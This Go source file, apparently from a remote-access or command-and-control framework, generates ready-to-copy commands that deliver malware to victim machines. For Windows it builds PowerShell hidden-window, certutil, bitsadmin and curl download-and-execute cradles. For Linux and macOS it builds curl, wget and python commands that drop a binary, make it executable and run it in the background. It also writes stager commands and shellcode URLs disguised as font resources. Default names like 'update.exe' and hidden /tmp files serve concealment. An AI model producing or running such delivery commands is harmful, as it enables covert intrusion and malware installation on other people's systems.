package delivery

import (
	"fmt"
	"net/url"
	"strings"
)

// CommandItem is one ready-to-copy online command
type CommandItem struct {
	Name        string `json:"name"`
	OS          string `json:"os"`
	Code        string `json:"code"`
	Description string `json:"description"`
}

// CommandOptions controls command generation
type CommandOptions struct {
	FullURL      string
	StagerURL    string
	ShellcodeURL string
	OS           string
	Arch         string
	Pass         string
	DownloadPath string
	SaveFilename string
	AccessToken  string // appended as ?t= if set
}

func withToken(rawURL, token string) string {
	if token == "" || rawURL == "" {
		return rawURL
	}
	if strings.Contains(rawURL, "?") {
		return rawURL + "&t=" + url.QueryEscape(token)
	}
	return rawURL + "?t=" + url.QueryEscape(token)
}

// GenerateCommands builds a multi-variant command matrix (P1)
func GenerateCommands(opt CommandOptions) []CommandItem {
	full := withToken(opt.FullURL, opt.AccessToken)
	stager := withToken(opt.StagerURL, opt.AccessToken)
	sc := withToken(opt.ShellcodeURL, opt.AccessToken)

	// osType 必须先去空白/转小写：save/path 的默认值与下面的分支都依赖它。
	// 原实现这里用 opt.OS == "windows" 做大小写敏感比较，而分支用 osType，
	// 一旦记录里存的是 "Windows"，就会生成 Windows 命令却套用 /tmp 的路径。
	osType := strings.ToLower(strings.TrimSpace(opt.OS))

	save := opt.SaveFilename
	if save == "" {
		if osType == "windows" {
			save = "update.exe"
		} else {
			save = "update"
		}
	}
	path := opt.DownloadPath
	if path == "" {
		if osType == "windows" {
			path = "C:\\Windows\\Temp"
		} else {
			path = "/tmp"
		}
	}
	pass := opt.Pass
	if pass == "" {
		pass = "password"
	}

	var items []CommandItem

	if osType == "windows" {
		// full payload
		winFull := strings.ReplaceAll(path+"\\"+save, "/", "\\")
		items = append(items,
			CommandItem{
				Name:        "PowerShell 下载执行",
				OS:          "windows",
				Description: "IWR 下载完整客户端并启动",
				Code: fmt.Sprintf(
					`powershell -nop -w hidden -c "IWR '%s' -OutFile '%s'; Start-Process '%s' -ArgumentList '%s'"`,
					full, winFull, winFull, pass,
				),
			},
			CommandItem{
				Name:        "certutil 下载执行",
				OS:          "windows",
				Description: "certutil 落地后启动",
				Code: fmt.Sprintf(
					`certutil -urlcache -split -f "%s" "%s" & start "" "%s" %s`,
					full, winFull, winFull, pass,
				),
			},
			CommandItem{
				Name:        "bitsadmin 下载",
				OS:          "windows",
				Description: "BITS 后台下载",
				Code: fmt.Sprintf(
					`bitsadmin /transfer job /download /priority high "%s" "%s" & "%s" %s`,
					full, winFull, winFull, pass,
				),
			},
			CommandItem{
				Name:        "curl.exe 下载执行",
				OS:          "windows",
				Description: "Win10+ 自带 curl",
				Code: fmt.Sprintf(
					`curl -o "%s" "%s" && "%s" %s`,
					winFull, full, winFull, pass,
				),
			},
		)
		if stager != "" {
			stagerPath := strings.ReplaceAll(path+"\\stager.exe", "/", "\\")
			items = append(items, CommandItem{
				Name:        "Stager PowerShell",
				OS:          "windows",
				Description: "小体积 stager，二次拉取完整载荷",
				Code: fmt.Sprintf(
					`powershell -nop -w hidden -c "IWR '%s' -OutFile '%s'; Start-Process '%s'"`,
					stager, stagerPath, stagerPath,
				),
			})
		}
		if sc != "" {
			items = append(items, CommandItem{
				Name:        "Shellcode URL (woff)",
				OS:          "windows",
				Description: "伪装资源地址，配合注入器使用",
				Code:        sc,
			})
			// IEX download cradle style note
			items = append(items, CommandItem{
				Name:        "PowerShell 拉取 shellcode 到变量",
				OS:          "windows",
				Description: "下载为 byte[]，需自行注入",
				Code: fmt.Sprintf(
					`powershell -nop -c "$b=(New-Object Net.WebClient).DownloadData('%s'); [IO.File]::WriteAllBytes('%s\\sc.bin',$b)"`,
					sc, strings.ReplaceAll(path, "/", "\\"),
				),
			})
		}
	} else {
		// linux / darwin
		linFull := strings.TrimRight(path, "/") + "/" + save
		items = append(items,
			CommandItem{
				Name:        "curl 下载执行",
				OS:          osType,
				Description: "curl 落地 chmod 后台运行",
				Code: fmt.Sprintf(
					`curl -fsSL "%s" -o "%s" && chmod +x "%s" && nohup "%s" %s >/dev/null 2>&1 &`,
					full, linFull, linFull, linFull, pass,
				),
			},
			CommandItem{
				Name:        "wget 下载执行",
				OS:          osType,
				Description: "wget 落地执行",
				Code: fmt.Sprintf(
					`wget -q -O "%s" "%s" && chmod +x "%s" && nohup "%s" %s >/dev/null 2>&1 &`,
					linFull, full, linFull, linFull, pass,
				),
			},
			CommandItem{
				Name:        "curl | sh 内存管道",
				OS:          osType,
				Description: "注意：需服务端提供脚本包装时更稳妥；此处为直接二进制参考",
				Code: fmt.Sprintf(
					`curl -fsSL "%s" -o /tmp/.%s && chmod +x /tmp/.%s && /tmp/.%s %s`,
					full, save, save, save, pass,
				),
			},
			CommandItem{
				Name:        "python 下载执行",
				OS:          osType,
				Description: "python3 urllib",
				Code: fmt.Sprintf(
					`python3 -c "import urllib.request,os;urllib.request.urlretrieve('%s','%s');os.chmod('%s',0o755);os.system('nohup %s %s >/dev/null 2>&1 &')"`,
					full, linFull, linFull, linFull, pass,
				),
			},
		)
		if stager != "" {
			items = append(items, CommandItem{
				Name:        "Stager curl",
				OS:          osType,
				Description: "下载动态 stager",
				Code: fmt.Sprintf(
					`curl -fsSL "%s" -o /tmp/.stager && chmod +x /tmp/.stager && nohup /tmp/.stager >/dev/null 2>&1 &`,
					stager,
				),
			})
		}
	}

	// generic raw URLs
	items = append(items, CommandItem{
		Name:        "完整客户端 URL",
		OS:          "all",
		Description: "直接下载地址",
		Code:        full,
	})
	if stager != "" {
		items = append(items, CommandItem{
			Name:        "Stager URL",
			OS:          "all",
			Description: "分阶段 stager 地址",
			Code:        stager,
		})
	}
	if sc != "" {
		items = append(items, CommandItem{
			Name:        "Shellcode/WOFF URL",
			OS:          "all",
			Description: "shellcode 或伪装资源",
			Code:        sc,
		})
	}
	return items
}
